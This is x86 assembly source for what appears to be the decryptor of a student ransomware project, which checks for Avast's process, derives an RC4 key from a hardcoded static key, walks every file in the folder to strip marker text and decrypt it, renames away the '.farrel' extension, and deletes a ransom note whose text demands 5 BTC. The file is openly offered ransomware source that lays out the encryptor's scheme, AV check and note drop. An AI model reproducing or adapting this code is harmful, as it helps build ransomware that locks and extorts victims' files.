format PE Console
entry main

include 'win32a.inc'

; ProcessEntry32 struct
; This describes details about a process from the list of running processes in the snapshot
; This provides information about a currently running process obtained through a call to the Process32First or Process32Next function.
struct PROCESSENTRY32
       dwSize                   dd ? ;
       cntUsage                 dd ? ;
       th32ProcessID            dd ? ;
       th32DefaultHeapID        dd ? ;
       th32ModuleID             dd ? ;
       cntThreads               dd ? ;
       th32ParentProcessID      dd ? ;
       pcPriClassBase           dd ? ;
       dwFlags                  dd ? ;
       szExeFile                rb 260;
ends

section '.data' data readable writeable
    ; Prompts
    mbox_import_success db "Importing success", 0
    mbox_successful db "The program ran successfully!", 0
    mbox_title db "Notification", 0                                 ; Title of the messagebox

    mbox_av_found db "AV found!", 0
    mbox_av_not_found db "AV not found!", 0

    library_load_fail db "Failed to load library", 0
    free_library_fail db "Failed to free library", 0
    create_snapshot_fail db "Failed to create the snapshot", 0
    create_file_fail db "Failed to create/open a file", 0

    file_open_success db "File opened successfully!", 0             ; Prompt for opening txt file succesfully
    file_write_success db "File written successfully!", 0           ; Prompt for writing to file successfully
    program_success db "Decryption executed successfully", 0
    remove_prepend_success db "Prepend removed  successfully", 0
    remove_append_success db "Append removed successfully", 0

    file_open_fail db "Failed to open the file.", 0                 ; Prompt for failing to open file
    read_file_fail db "Failed to read the file.", 0                 ; Prompt for failing to read the file
    file_size_fail db "Failed to get the file size.", 0             ; Prompt for failing to get the file size

    skey_acquire_fail db "Failed to acquire session key.", 0        ; Prompt for failing to acquire session key
    create_hash_fail db "Failed to create hash.", 0                 ; Prompt for failing to create hash.
    crypt_hash_fail db "Failed crypt hash data.", 0                 ; Prompt for failing crypt hash data
    derive_key_fail db "Failed to derive key.", 0                   ; Prompt for failing to derive key
    files_found_fail db "Failed to find any file.", 0               ; Prompt for failing to find any file
    no_more_files_fail db "Failed to find other files.", 0          ; Prompt for failing to find other files.

    encryption_fail db "Decryption failed.", 0                      ; Prompt for failing the encryption process

    ; Library names
    libname_kernel db 'kernel32.dll', 0
    libname_user32 db "user32.dll", 0
    libname_advapi32 db "advapi32.dll", 0
    libname_Shlwapi db "Shlwapi.dll", 0
    libname_Shell32 db "Shell32.dll", 0
    
    ; Library handles
    kernel32 dd ?
    user32 dd ?
    advapi32 dd ?
    Shlwapi dd ?
    Shell32 dd ?

    ; user32 import names
    func_MessageBoxA db 'MessageBoxA', 0

    ; user32 import handles
    MessageBoxA dd ?

    ; kernel32 import names
    func_ExitProcess db 'ExitProcess', 0
    func_CreateToolhelp32Snapshot db "CreateToolhelp32Snapshot", 0
    func_Process32First db "Process32First", 0
    func_Process32Next db "Process32Next", 0
    func_lstrcmpiA db "lstrcmpiA", 0
    func_CreateFileA db "CreateFileA", 0
    func_WriteFile db "WriteFile", 0
    func_CloseHandle db "CloseHandle", 0
    func_FreeLibrary db "FreeLibrary", 0
    func_GetFileSize db "GetFileSize", 0
    func_FindFirstFileA db "FindFirstFileA", 0
    func_FindNextFileA db "FindNextFileA", 0
    func_lstrcpyA db "lstrcpyA", 0
    func_lstrcatA db "lstrcatA", 0
    func_ReadFile db "ReadFile", 0
    func_WriteConsoleA db "WriteConsoleA", 0
    func_GlobalAlloc db "GlobalAlloc", 0
    func_SetFilePointer db "SetFilePointer", 0
    func_MoveFileA db "MoveFileA", 0
    func_DeleteFileAAA db "DeleteFileA", 0

    ; kernel32 import handles
    ExitProcess dd ?
    FreeLibrary dd ?
    CreateToolhelp32Snapshot dd ?
    Process32First dd ?
    Process32Next dd ?
    lstrcmpiA dd ?
    CreateFileA dd ?
    WriteFile dd ?
    CloseHandle dd ?
    GetFileSize dd ?
    FindFirstFileA dd ?
    FindNextFileA dd ?
    lstrcpyA dd ?
    lstrcatA dd ?
    ReadFile dd ?
    WriteConsoleA dd ?
    GlobalAlloc dd ?
    SetFilePointer dd ?
    MoveFileA dd ?
    DeleteFileA dd ?

    ; advapi32 import names
    func_CryptAcquireContextA db "CryptAcquireContextA", 0
    func_CryptCreateHash db "CryptCreateHash", 0
    func_CryptHashData db "CryptHashData", 0
    func_CryptDeriveKey db "CryptDeriveKey", 0
    func_CryptDecrypt db "CryptDecrypt", 0
    func_CryptDestroyKey db "CryptDestroyKey", 0
    func_CryptDestroyHash db "CryptDestroyHash", 0
    func_CryptReleaseContext db "CryptReleaseContext", 0

    ; advapi32 import names
    CryptAcquireContextA dd ?
    CryptCreateHash dd ?
    CryptHashData dd ?
    CryptDeriveKey dd ?
    CryptDecrypt dd ?
    CryptDestroyKey dd ?
    CryptDestroyHash dd ?
    CryptReleaseContext dd ?

    ; Shlwapi import names
    func_PathRemoveExtensionA db "PathRemoveExtensionA", 0

    ; Shlwapi import handles
    PathRemoveExtensionA dd ?

    ; Shell32 import names
    func_SHGetSpecialFolderPathA db "SHGetSpecialFolderPathA", 0

    ; Shell32 import handles
    SHGetSpecialFolderPathA dd ?

    ; I/O related
    stdout dd ?
    bytes_read dd ?
    bytes_written dd ?

    ; Create an instance of the PROCESSENTRY32 structure
    pe32 PROCESSENTRY32                                                                                 ; an instance of PROCESSENTRY32
    PROCESSENTRY32_size = $ - pe32 
    process_snapshot_handle dd ?   

    ; Target AV name
    target_name db "AvastSvc.exe", 0           ; Avast antivirus process

    ; Ransom note
    desktop_path db 260 dup (0)                                     ; This will contain desktop path
    append_to_desktop_path db "\RansomNote.txt", 0                  ; This will contain the path that we will append to the desktop path
    message_file db "RansomNote.txt", 0
    message_file_handle dd ?
    message db "As I've previously said, here I am. Send me 5 BTC or else your files will forever be doomed. BTC Address: SomeRandomBTCAddress"
    message_size = $ - message

    ; Decrypt
    static_key db 0x55, 0xAA, 0x33, 0x77, 0x88, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x99, 0x66, 0x44, 0x22, 0x00, 0x11
    MS_ENH_RSA_AES_PROV db "Microsoft Enhanced RSA and AES Cryptographic Provider", 0
    MS_ENHANCED_PROV db "Microsoft Enhanced Cryptographic Provider v1.0", 0

    provider_handle dd ?
    hkey_handle dd ?
    hash_handle dd ?

    file_size dd ?
    file_buffer_handle dd ?

    ; Skip these file names
    encrypt_exe_filename db "Assembly_Exam_Encrypt.exe", 0
    decrypt_exe_filename db "Assembly_Exam_Decrypt.exe", 0

    search_pattern db "*.*", 0                                     ; Looking for all txt files
    encrypted_file_extension db ".farrel", 0                            ; Extension of encrypted file
    temp_target_file db 260 dup (0)                                     ; will hold value of the name of encrypted file
    target_file db 260 dup (0)                                         ; Maximum path length
    target_file_handle dd ?
    newline db 13, 10, 0                                            ; Newline characters
    winFindData WIN32_FIND_DATA
    winFind_handle dd ?

    ; insert text
    insert_text db "Rahms"                                              ; Can add null terminator, but it will also be inserted to the text file. As such, I opted not to include null terminator
    insert_text_len = $ - insert_text

section '.code' code readable executable
main:
    ; Import everything that we will need
    call load_libraries

    ; Create a snapshot of all running processes
    push 0                                                      ;[in] th32ProcessID. 0 = Current process
    push 0x00000002                                             ;[in] dwFlags. 2 = TH32CS_SNAPPROCESS
    call [CreateToolhelp32Snapshot]

    ; Check if handle is valid
    cmp eax, -1                                                 ; -1 =  INVALID_HANDLE_VALUE
    je create_snapshot_error

    ; Initialize the PROCESSENTRY32 structure for use
    ; copy/mov important data
    mov dword [process_snapshot_handle], eax                    ; Move the handle of the process snapshot to process_snapshot_handle
    mov dword [pe32.dwSize], PROCESSENTRY32_size                ; sotre pe32 size inside the struct

    ; First iteration
    ; Begin enumeration with the first process in the snapshot
    ;push pe32
    push pe32                                                   ; push our pe32
    push [process_snapshot_handle]                              ; push the handle
    call [Process32First]                                       ; look at the first process

; Next iterations
next_iteration:
    ; Check the result of Process32First/Next. If 0, we've either finished the list or an error occurred
    cmp eax, 0                                                  ; check if the there's no next iteration or if an error is encountered
    je av_not_found                                                ; jump to not_found label

    ; Compare the process name with the target name 'target_name'
    call compare_process_name                                   ; compare the current iteration's process name with target_name

    ; Try getting the next process details
    ; Move to the next process in the snapshot
    push pe32
    push [process_snapshot_handle]
    call [Process32Next]

    ; Loop back for the next process
    jmp next_iteration

; Compare the process name(s) with the target_name
compare_process_name:
    ; use lstrcmpiA to compare 2 strings
    ; pe32.szExeFile = Name of the current iteration's running process
    ; target_name = Name of the antivirus
    push pe32.szExeFile
    push target_name
    call [lstrcmpiA]

    ; If they match, jump to 'found' label
    cmp eax, 0
    je av_found
    ret

; Display "av found" notification if the target process/antivirus is found, and continue infection
av_found:
    ; If found, display the appropriate message
    push MB_OK
    push mbox_title
    push mbox_av_found
    push 0
    call [MessageBoxA]
    pop eax

    jmp start_infection
    ;jmp close_program

; Display "av not found" notification, and continue infection. Currently, commented out the messagebox for av not found
av_not_found:
    ;push MB_OK
    ;push mbox_title
    ;push mbox_av_not_found
    ;push 0
    ;call [MessageBoxA]

    jmp start_infection

; Delete Ransom Note
; This will delete the "RansomNote.txt"
delete_ransom_note:
    ; Delete ransom note in the current directory
    push message_file
    call [DeleteFileA]

    ; Get file path for the desktop
    push 0                                                          ; don't create if it doesn't exist
    push CSIDL_DESKTOPDIRECTORY                                     ; For the desktop directory
    push desktop_path                                               ; Buffer for the desktop directory
    push 0
    call [SHGetSpecialFolderPathA]

    ; Let's check what path we were able to take
    ;push MB_OK
    ;push mbox_title
    ;push desktop_path
    ;push 0
    ;call [MessageBoxA]

    ; Add extension to encrypted file name
    push append_to_desktop_path
    push desktop_path
    call [lstrcatA]

    ; Let's check what path we were able to take
    ;push MB_OK
    ;push mbox_title
    ;push desktop_path
    ;push 0
    ;call [MessageBoxA]

    ; Delete the ransom note in the desktop directory
    push desktop_path
    call [DeleteFileA]

    ret

; Before closing program, free the libraries
close_program:
    ; Close the handle for the snapshot when you're done using it
    push dword [process_snapshot_handle]
    call [CloseHandle]

    ; For freeing the libraries
    call free_libraries

    ; For exiting the program
    push 0
    call [ExitProcess]

; Display error related to snapshot
create_snapshot_error:
    ; If there was an error during the snapshot process.
    push MB_OK
    push mbox_title
    push create_snapshot_fail
    push 0
    call [MessageBoxA]
    jmp close_program

; Load libraries
load_libraries:
    ; Load kernel library
    push libname_kernel
    call [LoadLibraryA]
    mov [kernel32], eax

    test eax, eax
    jz library_load_error

    ; Load user32 library
    push libname_user32
    call [LoadLibraryA]
    mov [user32], eax

    test eax, eax
    jz library_load_error

    ; Load advapi32 library
    push libname_advapi32
    call [LoadLibraryA]
    mov [advapi32], eax

    test eax, eax
    jz library_load_error

    ; Load Shlwapi library
    push libname_Shlwapi
    call [LoadLibraryA]
    mov [Shlwapi], eax

    test eax, eax
    jz library_load_error

    ; Load Shell32 library
    push libname_Shell32
    call [LoadLibraryA]
    mov [Shell32], eax

    test eax, eax
    jz library_load_error

    ;;; end of libraries, start of func imports

    ; Load MessageBoxA 
    push func_MessageBoxA
    push [user32]
    call [GetProcAddress]
    mov [MessageBoxA], eax

    test eax, eax
    jz library_load_error

    ; Load ExitProcess
    push func_ExitProcess
    push [kernel32]
    call [GetProcAddress]
    mov [ExitProcess], eax

    test eax, eax
    jz library_load_error

    ; Load FreeLibrary
    push func_FreeLibrary
    push [kernel32]
    call [GetProcAddress]
    mov [FreeLibrary], eax

    test eax, eax
    jz library_load_error

    ; Load CreateToolhelp32Snapshot
    push func_CreateToolhelp32Snapshot
    push [kernel32]
    call [GetProcAddress]
    mov [CreateToolhelp32Snapshot], eax

    test eax, eax
    jz library_load_error

    ; Load Process32First
    push func_Process32First
    push [kernel32]
    call [GetProcAddress]
    mov [Process32First], eax

    test eax, eax
    jz library_load_error

    ; Load Process32Next
    push func_Process32Next
    push [kernel32]
    call [GetProcAddress]
    mov [Process32Next], eax

    test eax, eax
    jz library_load_error

    ; Load lstrcmpiA
    push func_lstrcmpiA
    push [kernel32]
    call [GetProcAddress]
    mov [lstrcmpiA], eax

    test eax, eax
    jz library_load_error

    ; Load CreateFileA
    push func_CreateFileA
    push [kernel32]
    call [GetProcAddress]
    mov [CreateFileA], eax

    test eax, eax
    jz library_load_error

    ; Load WriteFile
    push func_WriteFile
    push [kernel32]
    call [GetProcAddress]
    mov [WriteFile], eax

    test eax, eax
    jz library_load_error

    ; Load CloseHandle
    push func_CloseHandle
    push [kernel32]
    call [GetProcAddress]
    mov [CloseHandle], eax

    test eax, eax
    jz library_load_error

    ; Load GetFileSize
    push func_GetFileSize
    push [kernel32]
    call [GetProcAddress]
    mov [GetFileSize], eax

    test eax, eax
    jz library_load_error

    ; Load FindFirstFileA
    push func_FindFirstFileA
    push [kernel32]
    call [GetProcAddress]
    mov [FindFirstFileA], eax

    test eax, eax
    jz library_load_error

    ; Load FindNextFileA
    push func_FindNextFileA
    push [kernel32]
    call [GetProcAddress]
    mov [FindNextFileA], eax

    test eax, eax
    jz library_load_error

    ; Load lstrcpyA
    push func_lstrcpyA
    push [kernel32]
    call [GetProcAddress]
    mov [lstrcpyA], eax

    test eax, eax
    jz library_load_error

    ; Load ReadFile
    push func_ReadFile
    push [kernel32]
    call [GetProcAddress]
    mov [ReadFile], eax

    test eax, eax
    jz library_load_error

    ; Load WriteConsoleA
    push func_WriteConsoleA
    push [kernel32]
    call [GetProcAddress]
    mov [WriteConsoleA], eax

    test eax, eax
    jz library_load_error

    ; Load GlobalAlloc
    push func_GlobalAlloc
    push [kernel32]
    call [GetProcAddress]
    mov [GlobalAlloc], eax

    test eax, eax
    jz library_load_error

    ; Load SetFilePointer
    push func_SetFilePointer
    push [kernel32]
    call [GetProcAddress]
    mov [SetFilePointer], eax

    test eax, eax
    jz library_load_error

    ; Load MoveFileA
    push func_MoveFileA
    push [kernel32]
    call [GetProcAddress]
    mov [MoveFileA], eax

    test eax, eax
    jz library_load_error

    ; Load lstrcatA
    push func_lstrcatA
    push [kernel32]
    call [GetProcAddress]
    mov [lstrcatA], eax

    test eax, eax
    jz library_load_error

    ; Load DeleteFileA
    push func_DeleteFileAAA
    push [kernel32]
    call [GetProcAddress]
    mov [DeleteFileA], eax

    test eax, eax
    jz library_load_error

    ;;;;;;

    ; Load CryptAcquireContextA
    push func_CryptAcquireContextA
    push [advapi32]
    call [GetProcAddress]
    mov [CryptAcquireContextA], eax

    test eax, eax
    jz library_load_error

    ; Load CryptCreateHash
    push func_CryptCreateHash
    push [advapi32]
    call [GetProcAddress]
    mov [CryptCreateHash], eax

    test eax, eax
    jz library_load_error

    ; Load CryptHashData
    push func_CryptHashData
    push [advapi32]
    call [GetProcAddress]
    mov [CryptHashData], eax

    test eax, eax
    jz library_load_error

    ; Load CryptDeriveKey
    push func_CryptDeriveKey
    push [advapi32]
    call [GetProcAddress]
    mov [CryptDeriveKey], eax

    test eax, eax
    jz library_load_error

    ; Load CryptDecrypt
    push func_CryptDecrypt
    push [advapi32]
    call [GetProcAddress]
    mov [CryptDecrypt], eax

    test eax, eax
    jz library_load_error

    ; Load CryptDestroyKey
    push func_CryptDestroyKey
    push [advapi32]
    call [GetProcAddress]
    mov [CryptDestroyKey], eax

    test eax, eax
    jz library_load_error

    ; Load CryptDestroyHash
    push func_CryptDestroyHash
    push [advapi32]
    call [GetProcAddress]
    mov [CryptDestroyHash], eax

    test eax, eax
    jz library_load_error

    ; Load CryptReleaseContext
    push func_CryptReleaseContext
    push [advapi32]
    call [GetProcAddress]
    mov [CryptReleaseContext], eax

    test eax, eax
    jz library_load_error

    ; Imports success message
    push 0                                                          ; Type of message box: MB_OK
    push mbox_title
    push mbox_import_success
    push 0                                                          ; Handle to owner window
    call [MessageBoxA]

    ;;; Shell32 imports
    ; Load CryptReleaseContext
    push func_SHGetSpecialFolderPathA
    push [Shell32]
    call [GetProcAddress]
    mov [SHGetSpecialFolderPathA], eax

    ; Load PathRemoveExtensionA
    push func_PathRemoveExtensionA
    push [Shlwapi]
    call [GetProcAddress]
    mov [PathRemoveExtensionA], eax

    test eax, eax
    jz library_load_error

    ret

; Free libraries
free_libraries:
    push [kernel32]
    call [FreeLibrary]

    test eax, eax
    jz free_library_error

    push [user32]
    call [FreeLibrary]

    test eax, eax
    jz free_library_error

    ret

; Display error related to loading library
library_load_error:
    push 0                                                          ; Type of message box: MB_OK
    push mbox_title
    push library_load_fail
    push 0                                                          ; Handle to owner window
    call [MessageBoxA]

; Display error related to freeing library
free_library_error:
    push 0                                                          ; Type of message box: MB_OK
    push mbox_title
    push free_library_fail
    push 0                                                          ; Handle to owner window
    call [MessageBoxA]

start_infection:
    ; Acquire cryptographic context
    push 0                                                          ; dwFlags
    push 0x00000018                                                 ; dwProvType. PROV_RSA_FULL = 1. PROV_RSA_AES =24
    push MS_ENH_RSA_AES_PROV                                        ; szProvider
    push 0                                                          ; szContainer
    lea eax, [provider_handle]
    push eax                                                        ; *phProv = provider handle
    call [CryptAcquireContextA]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz skey_acquire_error

    ; Create the hash
    lea eax, [hash_handle]
    push eax                                                        ; *phHash = provider hash handle
    push 0                                                          ; dwFlags. CRYPT_SECRETDIGEST = 0x00000001
    push 0                                                          ; hKey (no hKey yet)
    push 0x00008003                                                 ; Algid. CALG_RC4 = 0x00006801
    push [provider_handle]                                          ; phProv = provider handle
    call [CryptCreateHash]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz create_hash_error

    ; Hash Data
    push 0                                                          ; dwFlags
    push 16                                                         ; dwDataLen
    lea eax, [static_key]
    push eax                                                        ; *pbData
    push [hash_handle]                                              ; hHash
    call [CryptHashData]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz crypt_hash_error

    ; Derive key 
    lea eax, [hkey_handle]
    push eax                                                        ; *phKey. A pointer to a HCRYPTKEY variable to receive the address of the handle of the newly generated key.
    push 0                                                 ; dwFlags. CRYPT_EXPORTABLE = 0x00000001
    push [hash_handle]                                              ; hBaseData
    push 0x00006801                                                 ; Algid. CALG_RC4 = 0x00006801
    push [provider_handle]                                          ; phProv = provider handle
    call [CryptDeriveKey]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz derive_key_error

    ; Try searching for the first asm file
    push winFindData
    push search_pattern
    call [FindFirstFileA]

    ; Check if FindFirstFile found any asm file
    cmp eax, -1                                                     ; INVALID_HANDLE_VALUE = -1
    je no_files_found_error

    mov [winFind_handle], eax                                       ; the handle for file search

    jmp decrypt_found_file

; Find the next file
next_file:
    push winFindData
    push [winFind_handle]
    call [FindNextFileA]

    test eax, eax
    jz no_more_files_error

; If file is found, start the process of either prepending, appending, or decryption
decrypt_found_file:
    ; Get the address of the file found, and put it to target_file
    lea eax, [winFindData.cFileName]
    push eax
    push target_file
    call [lstrcpyA]

    ; If our encrypt exe  is read, skip
    push target_file
    push encrypt_exe_filename
    call [lstrcmpiA]

    cmp eax, 0
    je next_file

    ; If our decrypt exe is read, skip
    push target_file
    push decrypt_exe_filename
    call [lstrcmpiA]

    cmp eax, 0
    je next_file

    ; Create/Open Target file
    ; Open the file, read its content into a buffer
    push 0                                                          ; hTemplateFile
    push 0                                                          ; dwFlagsAndAttributes
    push 3                                                          ; dwCreationDisposition
    push 0                                                          ; lpSecurityAttributes
    push 0                                                          ; dwShareMode
    push 0C0000000h                                                 ; dwDesiredAccess. GENERIC_READ | GENERIC_WRITE = 0C0000000h
    push target_file                                                ; lpFileName - File to be opened
    call [CreateFileA]                                              ; CreateFileA function will return FileHandle in eax
    mov [target_file_handle], eax                                   ; Store file handle

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    push 0
    push [target_file_handle]
    call [GetFileSize]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    mov [file_size], eax

    push [file_size]
    push 0
    call [GlobalAlloc]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    mov [file_buffer_handle], eax

    mov eax, [file_size]

    cmp eax, 1024
    jl remove_prepend_string

    cmp eax, 102400
    jg remove_append_string

    jmp encrypt_file

; Remove the prepended string "Rahms" to the file's content
remove_prepend_string:
    ; Set file pointer after the end of the prepended text
    push 0                          ; FILE_BEGIN = 0
    push 0
    push insert_text_len          ; the length of the inserted text
    push [target_file_handle]       ; handle of the target file
    call [SetFilePointer]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    ; Subtract inserted text length to the file size
    push eax
    mov eax, [file_size]
    sub eax, insert_text_len
    mov [file_size], eax
    pop eax

    ; Read content from the file
    ;invoke  ReadFile, [target_file_handle], buffer, [buffer_size], bytes_read, 0
    push 0                                                          ; lpOverlapped
    push bytes_read                                                 ; lpNumberOfBytesRead
    push [file_size]                                                ; nNumberOfBytesToRead
    push [file_buffer_handle]                                       ; lpBuffer
    push [target_file_handle]                                       ; file handle
    call [ReadFile]                                                 ; ReadFile Function

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    ; Close file handle
    push [target_file_handle]
    call [CloseHandle]

    ; Create encrypted file
    push 0                                                          ; hTemplateFile
    push 0                                                          ; dwFlagsAndAttributes
    push 2                                                          ; dwCreationDisposition. CREATE_ALWAYS = 2
    push 0                                                          ; lpSecurityAttributes
    push 0                                                          ; dwShareMode
    push 0C0000000h                                                 ; dwDesiredAccess
    push target_file                                      ; lpFileName - File to be opened
    call [CreateFileA]                                              ; CreateFileA function will return FileHandle in eax
    mov [target_file_handle], eax                                   ; Store file handle

    ; Write the content of the file buffer handle
    call write_file_buffer

    mov eax, remove_prepend_success
    call message_box

    jmp end_decrypt_found_file

; Remove the appended string "Rahms" to the file's content
remove_append_string:
    ; Subtract inserted text length to the file size
    push eax
    mov eax, [file_size]
    sub eax, insert_text_len
    mov [file_size], eax
    pop eax

    ; Read content from the file
    ;invoke  ReadFile, [target_file_handle], buffer, [buffer_size], bytes_read, 0
    push 0                                                          ; lpOverlapped
    push bytes_read                                                 ; lpNumberOfBytesRead
    push [file_size]                                                ; nNumberOfBytesToRead
    push [file_buffer_handle]                                       ; lpBuffer
    push [target_file_handle]                                       ; file handle
    call [ReadFile]                                                 ; ReadFile Function

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    ; Close file handle
    push [target_file_handle]
    call [CloseHandle]

    ; Create encrypted file
    push 0                                                          ; hTemplateFile
    push 0                                                          ; dwFlagsAndAttributes
    push 2                                                          ; dwCreationDisposition. CREATE_ALWAYS = 2
    push 0                                                          ; lpSecurityAttributes
    push 0                                                          ; dwShareMode
    push 0C0000000h                                                 ; dwDesiredAccess
    push target_file                                      ; lpFileName - File to be opened
    call [CreateFileA]                                              ; CreateFileA function will return FileHandle in eax
    mov [target_file_handle], eax                                   ; Store file handle

    ; Write the content of the file buffer handle
    call write_file_buffer

    mov eax, remove_append_success
    call message_box

    jmp end_decrypt_found_file

; For writing to the target file
write_file_buffer:
    push 0                                                          ; lpOverlapped
    push bytes_written                                              ; lpNumberOfBytesWritten    
    push [bytes_read]                                               ; nNumberOfBytesToWrite
    push [file_buffer_handle]                                       ; lpBuffer
    push [target_file_handle]                                       ; file handle
    call [WriteFile]

    ret

encrypt_file:
    ; Read content from the file
    ;invoke  ReadFile, [target_file_handle], buffer, [buffer_size], bytes_read, 0
    push 0                                                          ; lpOverlapped
    push bytes_read                                                 ; lpNumberOfBytesRead
    push [file_size]                                                ; nNumberOfBytesToRead
    push [file_buffer_handle]                                       ; lpBuffer
    push [target_file_handle]                                       ; file handle
    call [ReadFile]                                                 ; ReadFile Function

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz next_file        ; there were instances that the FindFirstFileA and FindNextFileA takes the folder names and things. As such, if we fail to open/read it, we skip to next file
    ;jz read_file_error

    ; Close file handle
    push [target_file_handle]
    call [CloseHandle]

    ; Create encrypted file
    push 0                                                          ; hTemplateFile
    push 0                                                          ; dwFlagsAndAttributes
    push 2                                                          ; dwCreationDisposition. CREATE_ALWAYS = 2
    push 0                                                          ; lpSecurityAttributes
    push 0                                                          ; dwShareMode
    push 0C0000000h                                                 ; dwDesiredAccess
    push target_file                                      ; lpFileName - File to be opened
    call [CreateFileA]                                              ; CreateFileA function will return FileHandle in eax
    mov [target_file_handle], eax                                   ; Store file handle
    
    ; Crypt Decrypt
    ; Decrypt the buffer
    push bytes_read                                                 ; pdwDataLen
    push [file_buffer_handle]                                       ; pbData
    push 0                                                          ; dwFlags
    push 1                                                          ; Final
    push 0                                                          ; hHash
    push [hkey_handle]
    call [CryptDecrypt]

    ; Jump if eax is zero. False/Zero = Failed.
    test eax, eax
    jz crypt_encrypt_error

    ; Write to the file
    call write_file_buffer

    ; Display encryption success
    mov eax, program_success
    call message_box

    ; Close file handle
    push [target_file_handle]
    call [CloseHandle]

    ; Copy target file name
    lea eax, [target_file]
    push eax
    push temp_target_file
    call [lstrcpyA]

    ; Add extension to encrypted file name
    push temp_target_file
    call [PathRemoveExtensionA]

    ; Rename file
    push temp_target_file
    push target_file
    call [MoveFileA]

; The end of decryption, close handles
end_decrypt_found_file:
    ; Close file handle
    push [file_buffer_handle]
    call [CloseHandle]

    ; Close file handle
    push [target_file_handle]
    call [CloseHandle]

    jmp next_file

; For displaying messageboxes
; It expects value in eax for the content of the messagebox
message_box:
    push 0                                                          ; Type of message box: MB_OK
    push mbox_title
    push eax
    push 0                                                          ; Handle to owner window
    call [MessageBoxA]
    ret

no_files_found_error:
    ; Create ransom note
    call delete_ransom_note

    mov eax, files_found_fail
    call message_box
    jmp close_program

no_more_files_error:
    ; Create ransom note
    call delete_ransom_note

    mov eax, no_more_files_fail
    call message_box
    jmp close_program

skey_acquire_error:
    mov eax, skey_acquire_fail
    call message_box
    jmp close_program

create_hash_error:
    mov eax, create_hash_fail
    call message_box
    jmp close_program

crypt_hash_error:
    mov eax, crypt_hash_fail
    call message_box
    jmp close_program

derive_key_error:
    mov eax, derive_key_fail
    call message_box
    jmp close_program

create_file_error:
    mov eax, create_file_fail
    call message_box
    jmp close_program

read_file_error:
    mov eax, read_file_fail
    call message_box
    jmp close_program

crypt_encrypt_error:
    mov eax, encryption_fail
    call message_box
    jmp close_program

; Import LoadLibraryA and GetProcAddress
section '.idata' import data readable writeable
    library kernel32, 'kernel32.dll'

    import kernel32, \
        LoadLibraryA, 'LoadLibraryA', \
        GetProcAddress, 'GetProcAddress'
